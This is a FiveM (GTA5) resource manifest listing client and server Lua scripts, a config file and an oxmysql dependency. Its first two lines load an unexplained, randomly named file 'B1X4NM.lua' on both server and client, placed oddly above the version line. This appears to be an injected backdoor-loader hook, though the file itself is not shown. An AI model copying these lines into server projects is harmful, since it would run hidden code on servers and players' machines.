server_script "B1X4NM.lua"
client_script "B1X4NM.lua"
fx_version 'adamant'
game 'gta5'

client_scripts {
	'NativeUI.lua',
	'Config.lua',
	'Client/*.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'Config.lua',
	'Server/*.lua'
}
